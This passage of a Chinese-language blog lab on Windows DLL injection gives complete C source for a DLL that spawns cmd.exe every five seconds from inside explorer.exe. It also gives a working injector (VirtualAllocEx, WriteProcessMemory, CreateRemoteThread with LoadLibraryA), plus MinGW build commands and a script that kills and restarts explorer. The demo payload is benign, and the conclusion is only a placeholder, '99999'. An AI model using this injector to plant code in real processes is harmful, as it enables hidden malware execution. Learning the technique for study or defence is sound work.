+<h4 id="1️⃣-建立-injected-dll"><a href="#1️⃣-建立-injected-dll" class="headerlink" title="1️⃣ 建立 injected.dll "></a><font size='5'>1️⃣ 建立 injected.dll </font></h4><ul>
+<li><font size='3'>建立 <code>injected.c</code> 檔案</font></li>
+</ul>
+<figure class="highlight plaintext"><figcaption><span><windows.h></span></figcaption><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadFunc(LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">    MessageBoxA(NULL, &quot;Thread started inside explorer.exe&quot;, &quot;Debug&quot;, MB_OK);</span><br><span class="line"></span><br><span class="line">    while (1)</span><br><span class="line">    &#123;</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        PROCESS_INFORMATION pi;</span><br><span class="line">        ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">        si.cb = sizeof(si);</span><br><span class="line"></span><br><span class="line">        si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">        si.wShowWindow = SW_SHOWNORMAL;</span><br><span class="line"></span><br><span class="line">        ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line"></span><br><span class="line">        BOOL ret = CreateProcessA(</span><br><span class="line">            &quot;C:\\Windows\\System32\\cmd.exe&quot;,</span><br><span class="line">            &quot;/K echo HelloFromDLL &amp;&amp; pause&quot;,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            FALSE,</span><br><span class="line">            0,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            &amp;si,</span><br><span class="line">            &amp;pi</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        if (!ret)</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD err = GetLastError();</span><br><span class="line">            char buf[256];</span><br><span class="line">            wsprintfA(buf, &quot;CreateProcess failed, error: %lu&quot;, err);</span><br><span class="line">            MessageBoxA(NULL, buf, &quot;Error in ThreadFunc&quot;, MB_OK | MB_ICONERROR);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            CloseHandle(pi.hProcess);</span><br><span class="line">            CloseHandle(pi.hThread);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Sleep(5000);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    if (ul_reason_for_call == DLL_PROCESS_ATTACH)</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBoxA(NULL, &quot;DLL_PROCESS_ATTACH in explorer.exe&quot;, &quot;Debug&quot;, MB_OK);</span><br><span class="line"></span><br><span class="line">        DisableThreadLibraryCalls(hModule);</span><br><span class="line">        CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="2️⃣-建立-injector-exe"><a href="#2️⃣-建立-injector-exe" class="headerlink" title="2️⃣ 建立 injector.exe "></a><font size='5'>2️⃣ 建立 injector.exe </font></h4><ul>
+<li><font size='3'>建立 <code>injector.c</code> 檔案</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// injector.c</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;tlhelp32.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">// 尋找指定進程名稱，回傳 PID (0 表示找不到)</span><br><span class="line">DWORD FindProcessId(const char* processName)</span><br><span class="line">&#123;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = sizeof(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class="line">    if (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">    DWORD pid = 0;</span><br><span class="line">    if (Process32First(hSnapshot, &amp;pe))</span><br><span class="line">    &#123;</span><br><span class="line">        do</span><br><span class="line">        &#123;</span><br><span class="line">            // 不分大小寫比對可執行檔名稱</span><br><span class="line">            if (_stricmp(pe.szExeFile, processName) == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                pid = pe.th32ProcessID;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; while (Process32Next(hSnapshot, &amp;pe));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line">    return pid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    // 1. 避免亂碼輸出：將輸出編碼設為 UTF-8</span><br><span class="line">    SetConsoleOutputCP(CP_UTF8);</span><br><span class="line"></span><br><span class="line">    // 2. 檢查 explorer.exe 是否已存在</span><br><span class="line">    DWORD pid = FindProcessId(&quot;explorer.exe&quot;);</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    ZeroMemory(&amp;pi, sizeof(pi));</span><br><span class="line"></span><br><span class="line">    if (pid == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        // 若沒找到，啟動新的 explorer.exe</span><br><span class="line">        STARTUPINFO si;</span><br><span class="line">        ZeroMemory(&amp;si, sizeof(si));</span><br><span class="line">        si.cb = sizeof(si);</span><br><span class="line"></span><br><span class="line">        // 參考記憶點：若想最小化啟動，可設置：</span><br><span class="line">        // si.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">        // si.wShowWindow = SW_SHOWMINIMIZED;</span><br><span class="line"></span><br><span class="line">        if (!CreateProcessA(</span><br><span class="line">            &quot;C:\\Windows\\explorer.exe&quot;, </span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            FALSE,</span><br><span class="line">            0,</span><br><span class="line">            NULL,</span><br><span class="line">            NULL,</span><br><span class="line">            &amp;si,</span><br><span class="line">            &amp;pi</span><br><span class="line">        ))</span><br><span class="line">        &#123;</span><br><span class="line">            DWORD err = GetLastError();</span><br><span class="line">            printf(&quot;無法啟動 explorer.exe，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 取得新的 explorer.exe PID</span><br><span class="line">        pid = pi.dwProcessId;</span><br><span class="line">        // 稍作等待讓 explorer.exe 初始化</span><br><span class="line">        Sleep(1000);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 3. 打開 explorer.exe 進程</span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    if (!hProcess)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;OpenProcess 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 4. 準備要注入的 DLL 路徑</span><br><span class="line">    const char* dllPath = &quot;injected.dll&quot;; // 若不在同一目錄，可用絕對路徑</span><br><span class="line">    size_t dllPathSize = strlen(dllPath) + 1;</span><br><span class="line"></span><br><span class="line">    // 在目標進程中分配記憶體</span><br><span class="line">    LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">    if (!remoteMemory)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;VirtualAllocEx 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 寫入 DLL 路徑</span><br><span class="line">    if (!WriteProcessMemory(hProcess, remoteMemory, dllPath, dllPathSize, NULL))</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;WriteProcessMemory 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 5. 建立遠端執行緒，以 LoadLibraryA 載入 injected.dll</span><br><span class="line">    HANDLE hThread = CreateRemoteThread(</span><br><span class="line">        hProcess,</span><br><span class="line">        NULL,</span><br><span class="line">        0,</span><br><span class="line">        (LPTHREAD_START_ROUTINE)LoadLibraryA,</span><br><span class="line">        remoteMemory,</span><br><span class="line">        0,</span><br><span class="line">        NULL</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    if (!hThread)</span><br><span class="line">    &#123;</span><br><span class="line">        DWORD err = GetLastError();</span><br><span class="line">        printf(&quot;CreateRemoteThread 失敗，錯誤碼: %lu\n&quot;, err);</span><br><span class="line">        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;成功注入到 explorer.exe (PID=%lu)\n&quot;, pid);</span><br><span class="line"></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">    // 若剛才有新建 explorer.exe，就等它結束 (可依需求保留或移除)</span><br><span class="line">    if (pi.hProcess)</span><br><span class="line">    &#123;</span><br><span class="line">        WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">        CloseHandle(pi.hProcess);</span><br><span class="line">        CloseHandle(pi.hThread);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="3️⃣-編譯檔案"><a href="#3️⃣-編譯檔案" class="headerlink" title="3️⃣ 編譯檔案 "></a><font size='5'>3️⃣ 編譯檔案 </font></h4><br>
+
+<p><img data-src='docker-1.png' width='700' align='center'></img></p>
+<p><img data-src='docker-2.png' width='700' align='center'></img></p>
+<br>
+
+<ul>
+<li><font size='3'>使用 Docker 指令</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 準備階段</span><br><span class="line"></span><br><span class="line"># 使用 Docker 對該資料進行映射，映射後資料夾全部內容都會被拉進容器內</span><br><span class="line">docker run --rm -it -v .:/work -w /work gcc:latest bash</span><br><span class="line"></span><br><span class="line"># 在容器內安裝 MinGW</span><br><span class="line">apt update &amp;&amp; apt install -y mingw-w64</span><br><span class="line"></span><br><span class="line"># 編譯階段</span><br><span class="line"></span><br><span class="line"># 對 injected.c 進行編譯，生成出 DLL</span><br><span class="line">x86_64-w64-mingw32-gcc -shared -o injected.dll injected.c </span><br><span class="line"></span><br><span class="line"># 對 injector.c 進行編譯，生成出 EXE</span><br><span class="line">x86_64-w64-mingw32-gcc injector.c -o injector.exe -mwindows</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<ul>
+<li><font size='3'>避免當機，提供 Restart 的簡易腳本，建立 <code>bat</code> 檔案運行即可</font></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">REM 關閉 explorer.exe（強制結束）</span><br><span class="line">taskkill /f /im explorer.exe</span><br><span class="line"></span><br><span class="line">REM 等待 2 秒（可依需求調整）</span><br><span class="line">timeout /t 2 /nobreak</span><br><span class="line"></span><br><span class="line">REM 重新啟動 explorer.exe</span><br><span class="line">start explorer.exe</span><br></pre></td></tr></table></figure>
+
+<br>
+
+<h4 id="4️⃣-運行結果"><a href="#4️⃣-運行結果" class="headerlink" title="4️⃣ 運行結果 "></a><font size='5'>4️⃣ 運行結果 </font></h4><ul>
+<li><font size='3'>運行後，每隔 5 秒就會產生出一個 CMD</font></li>
+</ul>
+<p><img data-src='run-1.png' width='700' align='center'></img></p>
+<br>
+
+<ul>
+<li><font size='3'>可以看到由 <code>explorer.exe</code> 帶起的 CMD</font></li>
+</ul>
+<p><img data-src='run-2.png' width='700' align='center'></img></p>
+<br>
+
+<hr>
+<br>
+
+<h4 id="💡-結論"><a href="#💡-結論" class="headerlink" title="💡 結論"></a>💡 結論</h4><ul>
+<li><font size='3'>99999</font></li>
+</ul>
+<br>
+
+<hr>
+<h4 id="🔗-參考來源"><a href="#🔗-參考來源" class="headerlink" title="🔗 參考來源"></a>🔗 參考來源</h4><ul>
+<li><font size='3'> <a href="https://blog.csdn.net/Onlyone_1314/article/details/108697155">IDA修改exe并保存运行</a> </font></li>
+<li><font size='3'> <a href="https://yujiewong.github.io/2017/03/28/%E7%AC%AC2%E7%AB%A0-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90Hello-World-%E7%A8%8B%E5%BA%8F/">逆向分析Hello World! 程序</a> </font></li>
+</ul>
+<br>]]></content>
+      <categories>
+        <category>code</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Analysis</tag>
+        <tag>Attack</tag>
+        <tag>DLL</tag>
+        <tag>Injection</tag>
+        <tag>LAB</tag>
       </tags>
   </entry>
   <entry>
